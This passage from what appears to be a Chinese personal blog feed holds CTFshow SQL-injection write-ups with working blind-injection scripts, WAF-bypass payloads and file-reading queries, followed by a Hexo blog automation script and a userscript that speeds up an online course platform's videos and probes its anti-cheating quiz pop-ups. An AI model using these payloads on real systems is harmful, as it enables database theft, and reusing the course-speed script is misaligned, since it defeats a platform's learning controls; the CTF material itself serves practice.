data-language="python"><code class="language-python">import binasciiprint(binascii.b2a_hex(str(&#39;ctfshow%&#39;).encode()).decode().replace(&quot;b&#39;&quot;, &#39;&#39;).replace(&quot;&#39;&quot;, &quot;&quot;))</code></pre><p>然后就可以写脚本：</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL盲注2.py@Contact :   2997453446@qq.com@Blog    :   natro92.github.io@Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;10 19:49   natro92      1.0         None&quot;&quot;&quot;import requestsimport stringimport binasciidef _2hex(s):    &quot;&quot;&quot;    :param s: 需要转为十六进制的字符串    :return: 十六进制结果    &quot;&quot;&quot;    return binascii.b2a_hex(s.encode()).decode().replace(&quot;b&#39;&quot;, &#39;&#39;).replace(&quot;&#39;&quot;, &quot;&quot;)url &#x3D; r&#39;http:&#x2F;&#x2F;303b0ea1-6fc8-4947-9730-47d85b4a3c1c.challenge.ctf.show&#x2F;select-waf.php&#39;str &#x3D; r&#39;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;payload &#x3D; &quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;&#125;&quot;i &#x3D; 0key &#x3D; 0while (1):    if key &#x3D;&#x3D; 1:        break    print(i)    i +&#x3D; 1    for j in str:        data &#x3D; &#123;            &#39;tableName&#39;: payload.format(&#39;0x&#39; + _2hex(flag_pre + j + &quot;%&quot;))        &#125;        r &#x3D; requests.post(url, data&#x3D;data)        if &#39;$user_count &#x3D; 43&#39; in r.text:            flag_pre +&#x3D; j            print(flag_pre)            if j &#x3D;&#x3D; &#39;&#125;&#39;:                key &#x3D; 1</code></pre><p>注意，判断条件的43是使用payload所知道的。<br> 此外，还可以使用如下payload：</p><pre class="language-python" data-language="python"><code class="language-python">tableName&#x3D;ctfshow_user group by pass having pass  like 0x63746673686f7725</code></pre><h2 id="group-by和having关键字"><a href="#group-by和having关键字" class="headerlink" title="group by和having关键字"></a>group by和having关键字</h2><p>HAVING 是 SQL 中用于对分组后的结果进行筛选的关键字。它通常与 GROUP BY 关键字一起使用，用于对分组后的结果进行聚合计算和筛选。<br>比如：</p><pre class="language-python" data-language="python"><code class="language-python">SELECT student, AVG(score) AS avg_scoreFROM scoresGROUP BY studentHAVING avg_score &gt;&#x3D; 90;</code></pre><p><code>HAVING pass LIKE 0x63746673686f7725 </code>对分组后的结果进行筛选，只返回 pass 列中包含字符串 <code>0x63746673686f7725</code> 的分组。<br>这里就不写脚本了，注意所对应的条件是返回中存在<code>$user_count = 1</code></p><h1 id="web185、web186"><a href="#web185、web186" class="headerlink" title="web185、web186"></a>web185、web186</h1><h3 id="使用true关键字等来绕过数字过滤-chr函数"><a href="#使用true关键字等来绕过数字过滤-chr函数" class="headerlink" title="使用true关键字等来绕过数字过滤 chr函数"></a>使用true关键字等来绕过数字过滤 chr函数</h3><p>数字被过滤了。</p><pre class="language-php" data-language="php"><code class="language-php">function waf($str)&#123;  return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);&#125;</code></pre><p>true关键字再mysql中等价为1，也就是可以true+true&#x3D;2，因此可以由此构造出任何数字。<br>因此我们可以字符串-&gt;转为十进制数字-&gt;chr和concat函数拼接合成为payload中的需要字符串。<br>脚本如下：</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL盲注3.py@Contact :   2997453446@qq.com@Blog    :   natro92.github.io@Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;10 20:16   natro92      1.0         None&quot;&quot;&quot;import requestsimport stringimport binascii# 将数字转换为true相加def num2True(num):    a &#x3D; &#39;true&#39;    if num !&#x3D; 1:        for i in range(num - 1):            a +&#x3D; &#39;+true&#39;    return a    # 将文本转换为concat和chr函数结合的格式    # 比如：aa -&gt; chr(一大堆true相加),chr(又一大堆true相加)def change_style(s):    str1 &#x3D; &#39;&#39;    str1 +&#x3D; &#39;chr(&#39; + num2True(ord(s[0])) + &#39;)&#39;    for i in s[1:]:        str1 +&#x3D; &#39;,chr(&#39; + num2True(ord(i)) + &#39;)&#39;    return str1url &#x3D; r&#39;http:&#x2F;&#x2F;76c1b9c5-22be-4d38-8e83-4cdf71d2b93a.challenge.ctf.show&#x2F;select-waf.php&#39;str &#x3D; r&#39;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;payload &#x3D; &quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&#123;&#125;))&quot;i &#x3D; 0key &#x3D; 0while (1):    if key &#x3D;&#x3D; 1:        break    print(i)    i +&#x3D; 1    for j in str:        data &#x3D; &#123;            &#39;tableName&#39;: payload.format(change_style(flag_pre + j + &#39;%&#39;))        &#125;        r &#x3D; requests.post(url, data&#x3D;data)        if &#39;$user_count &#x3D; 43&#39; in r.text:            flag_pre +&#x3D; j            print(flag_pre)            if j &#x3D;&#x3D; &#39;&#125;&#39;:                key &#x3D; 1</code></pre><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>不止有true可以生成任意数字，以下几个函数也可以：</p><pre class="language-python" data-language="python"><code class="language-python">ceil() floor() true version() pi()</code></pre><h1 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h1><h3 id="绕过sqlMD5加密的万能串ffifdyop"><a href="#绕过sqlMD5加密的万能串ffifdyop" class="headerlink" title="绕过sqlMD5加密的万能串ffifdyop"></a>绕过sqlMD5加密的万能串ffifdyop</h3><p>用MD5加密密码，<code>ffifdyop</code>正好可以得到<code>&#39;or&#39;6�]��!r,��b</code><br>也就达到了绕过的目的。<br>注意flag在返回包中。</p><h1 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h1><h3 id="弱比较-sql中-等价于or"><a href="#弱比较-sql中-等价于or" class="headerlink" title="弱比较 sql中||等价于or"></a>弱比较 sql中||等价于or</h3><pre class="language-python" data-language="python"><code class="language-python">&#x2F;&#x2F;密码判断 if($row[&#39;pass&#39;]&#x3D;&#x3D;intval($password))&#123;     $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;     array_push($ret[&#39;data&#39;], array(&#39;flag&#39;&#x3D;&gt;$flag));   &#125;</code></pre><p>flag为字符串，字符串的intval永远为0.因此传入0即可。<br><code>username=1||1&amp;password=0</code></p><h1 id="web189"><a href="#web189" class="headerlink" title="*web189"></a>*web189</h1><h3 id="布尔盲注-if-load-file-locate"><a href="#布尔盲注-if-load-file-locate" class="headerlink" title="布尔盲注 if load_file locate"></a>布尔盲注 if load_file locate</h3><p>提示里有说：</p><pre class="language-none"><code class="language-none">flag在api&#x2F;index.php文件中</code></pre><p>那么这里就需要盲注来解决。<br>mysql导入外部文件查询。</p><ul><li>load_file(path)导入文件</li><li>locate(substr,str)获取匹配到的字符串位置</li></ul><p>这道题的payload就是：</p><pre class="language-python" data-language="python"><code class="language-python">if(locate(&quot;ctfshow&#123;&quot;,&#39; + &#39;load_file(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php&quot;))&gt;这里是位置,0,1)</code></pre><p>让我们看看gpt怎么说<br>如果 ‘ctfshow{‘ 在 “&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php” 文件的内容中存在，并且位置大于 1（即找到了），那么条件表达式 locate(“ctfshow{“,’ + ‘load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php”))&gt;1 将返回真，进入条件为真的分支，即返回 0。<br>接下来就是写脚本。<br>这个脚本最开始每太想出来怎么写，看了下大佬们的wp，才明白。这里会将wp中的脚本也列举出来。<br>脚本的思路就是，先搜索到flag的位置，然后一步一步给他读出来。<br>盲注需要找到回显的地方。<br>可以注意到，密码为0时，当账号为0，返回的是密码错误<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075241167-f497b6be-cc54-40e6-8a25-06d580071436.png" alt="image.png"><br>当账号为1时，返回的是查询失败<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075274763-4a0331a8-9216-4583-ae04-4d2e80f13121.png" alt="image.png"><br>勾<del>吧，payload测试一半不能用了，以为是写错了，重启靶场就好了。</del><br>用下面这个来看是什么字符</p><pre class="language-python" data-language="python"><code class="language-python">if(substr(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),0,1)</code></pre><p>勾吧题， wp很好理解，脚本写了三个小时整。<br>6点48开始写 9点48才写完。太抽象了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689083298083-26b2335c-3036-4323-a955-54b23f46827f.png" alt="image.png"><br>python基础太差了，就这还是照着wp的解法写的。</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL布尔盲注.py@Contact :   2997453446@qq.com@Blog    :   natro92.github.io@Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;11 18:48   natro92      1.0         None&quot;&quot;&quot;import stringimport requestsurl &#x3D; r&#39;http:&#x2F;&#x2F;2daeac7e-8170-4826-9997-2b4a8a6ec9ca.challenge.ctf.show&#x2F;api&#x2F;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str1 &#x3D; &quot;abcdefghijklmnopqr-stuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ &#125;&quot;payload &#x3D; &#39;&#39;# 先找flag在哪：def find_flag():    left &#x3D; 0    right &#x3D; 1000  # 这里根据实际情况进行修改    while left &lt; right:        mid &#x3D; (left + right) &#x2F;&#x2F; 2  # &#x2F;&#x2F;floor整除        data &#x3D; &#123;            &#39;username&#39;: &#39;if(locate(&quot;&#39; + flag_pre + &#39;&quot;,load_file(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php&quot;))&gt;&#123;&#125;,0,1)&#39;.format(mid),            &#39;password&#39;: &#39;0&#39;        &#125;        r &#x3D; requests.post(url, data&#x3D;data)        if &#39;密码错误&#39; in r.json()[&#39;msg&#39;]:            left &#x3D; mid + 1        else:            right &#x3D; mid    return int(mid)def get_flag(pos1, flag_pre1, stra):    pos1 +&#x3D; len(flag_pre1)+1    while 1:        for j in stra:            data &#x3D; &#123;                &#39;username&#39;: &quot;if(substr(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),0,1)&quot;.format(str(pos1), j),                &#39;password&#39;: &#39;0&#39;            &#125;            r &#x3D; requests.post(url, data&#x3D;data)            # print(data)            # print(r.json()[&#39;msg&#39;])            if &#39;密码错误&#39; in r.json()[&#39;msg&#39;]:                flag_pre1 +&#x3D; j                pos1 +&#x3D; 1                break            if j &#x3D;&#x3D; &#39;&#125;&#39;:                exit()        print(flag_pre1)    return flag_pre1pos &#x3D; find_flag()print(get_flag(pos, flag_pre, str1))</code></pre><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>这里面payload是不能使用单引号的，单引号会导致前面闭合以至于不能够查询。要使用双引号。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075867993-0f9922b1-6204-4e3a-842a-5063ace97744.png" alt="image.png"></p><h1 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h1><p>在查询语句里面加了单引号<code>username = &#39;&#123;$username&#125;&#39;</code><br>不用读文件了，直接就读数据就可以。<br>payload：<br><code>username=admin&#39;||1||&#39;</code><br>那就可以把上面那个payload去掉第一段方法。<br>找到布尔盲注构造位置：<br><code>username=admin&#39;and+0#&amp;password=0</code>：<br>返回用户名不存在<br><code>username=admin&#39;and+1#&amp;password=0</code>：<br>返回密码错误<br>由此编写脚本：（20min）</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL布尔盲注2.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;11 22:02   natro92      1.0         None&quot;&quot;&quot;import stringimport requestsurl &#x3D; r&#39;http:&#x2F;&#x2F;96880f33-872c-4e26-9e91-a87d096bb6e2.challenge.ctf.show&#x2F;api&#x2F;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ -&#125;&quot;# payload &#x3D; &quot;admin&#39;and+if(substr(database(),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;res &#x3D; &#39;&#39;for i in range(1,100):    for j in str1:        data &#x3D; &#123;            &#39;username&#39;: payload.format(i, j),            &#39;password&#39;: &#39;0&#39;        &#125;        r &#x3D; requests.post(url, data&#x3D;data)        # print(data)        # print(r.json()[&#39;msg&#39;])        if &#39;密码错误&#39; in r.json()[&#39;msg&#39;]:            res +&#x3D; j            print(res)            break        if j &#x3D;&#x3D; &#39;&#125;&#39;:            exit()</code></pre><p>分别修改payload参数可以得到需要的名称：</p><pre class="language-python" data-language="python"><code class="language-python">payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;</code></pre><p><code>ctfshow_fl0g,ctfshow_user</code></p><pre class="language-python" data-language="python"><code class="language-python">payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;</code></pre><p><code>id,f1ag</code></p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL布尔盲注2.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;11 22:02   natro92      1.0         None&quot;&quot;&quot;import stringimport requestsimport timeurl &#x3D; r&#39;http:&#x2F;&#x2F;96880f33-872c-4e26-9e91-a87d096bb6e2.challenge.ctf.show&#x2F;api&#x2F;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ -&#125;&quot;# payload &#x3D; &quot;admin&#39;and+if(substr(database(),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;# payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;res &#x3D; &#39;&#39;for i in range(1,100):    for j in str1:        data &#x3D; &#123;            &#39;username&#39;: payload.format(i, j),            &#39;password&#39;: &#39;0&#39;        &#125;        r &#x3D; requests.post(url, data&#x3D;data)        # print(data)        # print(r.json()[&#39;msg&#39;])        if &#39;密码错误&#39; in r.json()[&#39;msg&#39;]:            res +&#x3D; j            print(res)            break            time.sleep(0.3)        if j &#x3D;&#x3D; &#39;&#125;&#39;:            exit()</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果脚本编写异常，</p><pre class="language-python" data-language="python"><code class="language-python">print(data)print(r.json()[&#39;msg&#39;])</code></pre><p>这俩玩应是非常有用的。<br>如果由于因为太快导致的json报错，可以手动加一行休眠</p><pre class="language-python" data-language="python"><code class="language-python">import time time.sleep(0.3)</code></pre><p>即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Python脚本修改语雀导文件图片格式</title>
      <link href="/posts/b65adfd/"/>
      <url>/posts/b65adfd/</url>
      
        <content type="html"><![CDATA[<p>用了语雀的md编辑器，感觉typora有点用不惯，但是语雀的到处图片会有限制，虽然能够浏览，但是使用hexo之后就不行了，寻找了几个方法，最好用的就是修改图片格式，将地址后的参数删除掉。<br>一个一个改太费劲了，因此写了一个简单的python脚本来代替机械劳动。</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   YuQueShareLink.py@Contact :   2997453446@qq.com@Blog :   natro92.github.io@Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;5&#x2F;16 21:04   natro92      1.0         将语雀链接在导出到博客时可以正常使用&quot;&quot;&quot;import reimport sysdef replace_string_in_file(file_path):    with open(file_path, &quot;r&quot;, encoding&#x3D;&quot;utf-8&quot;, errors&#x3D;&quot;ignore&quot;) as file:        content &#x3D; file.read()        # 使用正则表达式匹配所有符合条件的字符串，并进行替换操作    replaced_content &#x3D; re.sub(r&quot;.png)&quot;, &quot;.png)&quot;, content)    with open(file_path, &quot;w&quot;, encoding&#x3D;&quot;utf-8&quot;, errors&#x3D;&quot;ignore&quot;) as file:        file.write(replaced_content)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(&quot;请提供需要处理的文件路径, 且文件需要和该py脚本处在同一文件夹下，比如：我的博客.md&quot;)    file_path &#x3D; input(&quot;路径：&quot;)    is_end_of_md &#x3D; re.search(r&quot;\.md&quot;, file_path)    if not is_end_of_md:        file_path +&#x3D; &quot;.md&quot;    replace_string_in_file(file_path)</code></pre><p>改完这个了，想要同步到hexo，需要有一步<code>hexo new 文章名称</code>，这样会生成一个文件头，一般我会把这个修改后的文章内容复制到那个新生成的文件，并且修改tag、category等参数。<br>那么能不能直接把这些东西都合并到一起呢？<br>通过万能的互联网，添加一点代码：</p><pre class="language-python" data-language="python"><code class="language-python">def add_headers_in_file(file_path):    file_name &#x3D; os.path.basename(file_path)    replaced_content &#x3D; re.sub(r&quot;.md&quot;, &quot;&quot;, file_name)    time_str &#x3D; datetime.now().strftime(&#39;%Y-%m-%d %H:%M:%S&#39;)    with open(file_path, &#39;r+&#39;, encoding&#x3D;&quot;utf-8&quot;, errors&#x3D;&quot;ignore&quot;) as f:        contents &#x3D; f.read()        print(&#39;当前tags:&#39;, [&#39;WriteUp&#39;, &#39;CTFshow0-1&#39;])        print(&#39;当前categories:&#39;, [&#39;CTF&#39;])        new_tags &#x3D; input(&#39;你想要修改tags吗？ (y&#x2F;n) 默认n&#39;)        if new_tags.lower() &#x3D;&#x3D; &#39;y&#39;:            tags_str &#x3D; input(&#39;输入你的tags，注意用英文逗号分隔: &#39;)            tags &#x3D; [tag.strip() for tag in tags_str.split(&#39;,&#39;)]        else:            tags &#x3D; [&#39;WriteUp&#39;, &#39;CTFshow0-1&#39;]        new_categories &#x3D; input(&#39;你想要修改tags吗？(y&#x2F;n) 默认n&#39;)        if new_categories.lower() &#x3D;&#x3D; &#39;y&#39;:            categories_str &#x3D; input(&#39;输入你的categories，注意用英文逗号分隔: &#39;)            categories &#x3D; [category.strip() for category in categories_str.split(&#39;,&#39;)]        else:            categories &#x3D; [&#39;CTF&#39;]        new_contents &#x3D; &#39;---\n&#39; \                       &#39;title: &#39; + file_name + &#39;\n&#39; \                                               &#39;date: &#39; + time_str + &#39;\n&#39; \                                                                     &#39;tags:\n&#39;        for tag in tags:            new_contents +&#x3D; &#39;  - &#39; + tag + &#39;\n&#39;        new_contents +&#x3D; &#39;categories:\n&#39;        for category in categories:            new_contents +&#x3D; &#39;  - &#39; + category + &#39;\n&#39;        new_contents +&#x3D; &#39;---\n&#39; \                        + contents        f.seek(0)        f.write(new_contents)</code></pre><p>这个功能完成了，下面就是一键上传和更新到私有仓库了。<br>其实这里是可以使用hexo自带的库（hexo-uploader）但是为了简化、简单代码，这里就调用powershell来实现hexo的生成的发布。并且远程git给私有仓库。<br>其实hexo自带备份功能，但是似乎会和文件存到一起。因此我还是选择了单独创一个仓库保存的方法。<br>调用cmd来跑命令，因为之前git的信息和hexo的配置已经配置过了，因此直接使用就行。</p><pre class="language-python" data-language="python"><code class="language-python">def hexo_generate_and_deploy():    # cmd命令 cd后修改为你自己的blog文件夹位置    # 字符串前面加r防止解析，或者将单斜杠转换为双斜杠    cmd &#x3D; r&#39;cd C:\Users\natro92\Desktop\blog &amp;&amp; hexo g &amp;&amp; hexo d&#39;    p &#x3D; subprocess.Popen(cmd, shell&#x3D;True, stdout&#x3D;subprocess.PIPE)    print(p.stdout.read().decode())    a &#x3D; input(&#39;按任意键继续&#39;)def git_backup():    # 实现备份git功能    # 切换到本地的git仓库目录    repo_dir &#x3D; r&#39;C:\Users\natro92\Desktop\blog&#39;    # python3.6特性，格式化文本    cmd_cd &#x3D; f&#39;cd &#123;repo_dir&#125; &amp;&amp; &#39;    cmd_add &#x3D; &#39;git add .&#39;    commit_msg &#x3D; &#39;%date:~0,4%%date:~5,2%%date:~8,2%&#39;    cmd_commit &#x3D; f&#39;git commit -m &quot;&#123;commit_msg&#125;&quot;&#39;    cmd_push &#x3D; &#39;git push&#39;    cmd &#x3D; cmd_cd + cmd_add + &#39; &amp;&amp; &#39; + cmd_commit + &#39; &amp;&amp; &#39; + cmd_push    result &#x3D; subprocess.run(cmd, shell&#x3D;True, stdout&#x3D;subprocess.PIPE)    print(result.stdout.decode())</code></pre><p>就是简单的造轮子，但是能够让自己造轮子的效率更高。<br>附上完整版链接：<a href="https://github.com/natro92/YuQueShareLink">https://github.com/natro92/YuQueShareLink</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
            <tag> Shortcut </tag>
            
            <tag> 语雀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的智慧树倍速油猴脚本（一）</title>
      <link href="/posts/ecf1a26a/"/>
      <url>/posts/ecf1a26a/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：BYD智慧树嘎嘎刷视频，1.5倍速太浪费时间了，通过查看前端代码发现了一种逃课方法。可以通过修改播放器的倍速播放功能来实现加速播放效果。</p></blockquote><pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#x2F;&#x2F; &#x3D;&#x3D;UserScript&#x3D;&#x3D;&#x2F;&#x2F; @name         智慧树16倍速自动脚本&#x2F;&#x2F; @namespace    http:&#x2F;&#x2F;natro92.github.io&#x2F;&#x2F; @version      0.1&#x2F;&#x2F; @description  自动修改脚本倍速x1.5-&gt;x16&#x2F;&#x2F; @author       natro92&#x2F;&#x2F; @match        *:&#x2F;&#x2F;*.zhihuishu.com&#x2F;*&#x2F;&#x2F; @icon         https:&#x2F;&#x2F;www.google.com&#x2F;s2&#x2F;favicons?sz&#x3D;64&amp;domain&#x3D;zhihuishu.com&#x2F;&#x2F; @grant        GM_log&#x2F;&#x2F; @require      https:&#x2F;&#x2F;code.jquery.com&#x2F;jquery-2.1.4.min.js&#x2F;&#x2F; &#x3D;&#x3D;&#x2F;UserScript&#x3D;&#x3D;function changeSpeed()&#123;  GM_log(&quot;change speeed begins!&quot;);  &#x2F;&#x2F;0 - 1.0 | 1 - 1.25 | 2 - 1.5  var speed2 &#x3D; document.querySelector(&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab15&quot;);  speed2.setAttribute(&quot;rate&quot;,&quot;16.0&quot;);  speed2.innerHTML &#x3D; &quot;X 16.0&quot;;  var speed1 &#x3D; document.querySelector(&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab10&quot;);  speed1.setAttribute(&quot;rate&quot;,&quot;8.0&quot;);  speed1.innerHTML &#x3D; &quot;X 8.0&quot;;  var speed0 &#x3D; document.querySelector(&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab05&quot;);  speed0.setAttribute(&quot;rate&quot;,&quot;4.0&quot;);  speed0.innerHTML &#x3D; &quot;X 4.0&quot;;&#125;(function() &#123;  &#39;use strict&#39;;  &#x2F;&#x2F;修改播放器的倍速值  GM_log(&quot;Hello World！&quot;);  &#x2F;&#x2F; 修改value属性  &#x2F;&#x2F; var speed &#x3D; document.getElementsByClassName(&#39;speedTab15&#39;)[0];  &#x2F;&#x2F; console.log(speed.innerHTML);  &#x2F;&#x2F; speed.setAttribute(&#39;rate&#39;,&#39;16.0&#39;);  &#x2F;&#x2F; speed.innerHTML &#x3D; &quot;X 16.0&quot;;  &#x2F;&#x2F; setTimeout(function()&#123;  &#x2F;&#x2F;     changeSpeed();  &#x2F;&#x2F; &#125;, 5000);  &#x2F;&#x2F; byd傻逼智慧树一秒渲染完成不了，延迟五秒加载、  &#x2F;&#x2F; 等待页面渲染成功之后修改  window.addEventListener(&#39;load&#39;, function() &#123;    changeSpeed();    &#x2F;&#x2F;模拟点击，自动修改倍速    &#x2F;&#x2F;这个不行，会检测到脚本问题    &#x2F;&#x2F; var e &#x3D; document.createEvent(&quot;MouseEvents&quot;);    &#x2F;&#x2F; e.initEvent(&quot;click&quot;, true, true);    &#x2F;&#x2F; document.querySelector(&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab05&quot;).dispatchEvent(e);  &#125;);  GM_log(&quot;Finished yet！&quot;);&#125;)();</code></pre><p>但是这样只做到了修改默认页面的倍速栏，但是想要修改其他的页面的却做不到。</p><p>除此之外，智慧树有脚本检测，因此模拟点击无法使用了。<br>经过抓包发现，修改倍速写在了前端中，暂停时会有时长保存，可以尝试其他方式来达到修改。<br>基础功能已经实现了，下一步就是播放检测。<br>当暂停状态下id（路径：<code>document.querySelector(&quot;#playButton&quot;)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684912224706-9e4ffb01-c67b-4d25-aff7-479a2237a766.png" alt="image.png"><br>播放时：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684912271465-fafa5847-3a00-4b59-b21f-53901e2b6346.png" alt="image.png"><br>检测播放写完了，下面就是勾吧弹窗的问题了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684913986235-680c6439-096a-4bda-abe9-f340b71de737.png" alt="image.png"><br>位置：<code>document.querySelector(&quot;#playTopic-dialog &gt; div&quot;)</code><br>我们要点击其中的选择按钮，再提交。才行<br>想法有两个<br>第一个是选择错误之后选择一个一个尝试直到弹框消失，第二个是选择错误之后检测正确答案，提交正确答案。<br>返回正常页面时发现，弹框不是隐藏的，而是有题目新创建一个。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684916243149-df686aec-b7f0-444d-8f8f-628c6b8e22f2.png" alt="image.png"><br>搞了下别人的账号，用了一下发现答案在没答的时候不会分发，html处是注释。<br>直接提交正确答案：<br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__body &gt; div &gt; div.el-scrollbar__wrap &gt; div &gt; div &gt; div.radio &gt; div &gt; p &gt; span&quot;)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684916770084-1ff9abd9-728a-4952-bf9d-bbdd0c631d73.png" alt="image.png"><br>有个选中和未选中<br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__body &gt; div &gt; div.el-scrollbar__wrap &gt; div &gt; div &gt; div.radio &gt; ul &gt; li:nth-child(1) &gt; div:nth-child(1) &gt; svg &gt; use&quot;)</code><br>中的href值从<code>#iconxuan</code>转变为<code>#iconxuanzhong</code><br>并且点击关闭按钮继续。<br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__footer &gt; span &gt; div&quot;)</code><br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__header &gt; button &gt; i&quot;)</code></p><p><code>#playTopic-dialog &gt; div &gt; div.el-dialog__footer &gt; span &gt; div</code><br>勾吧弹窗推出没调好，还得调。<br>先搁置了，等过段时间，出新的刷课视频的时候接着搞。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
            <tag> Tampermonkey </tag>
            
            <tag> Shortcut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web151-web170文件上传篇</title>
      <link href="/posts/94aa1d46/"/>
      <url>/posts/94aa1d46/</url>
      
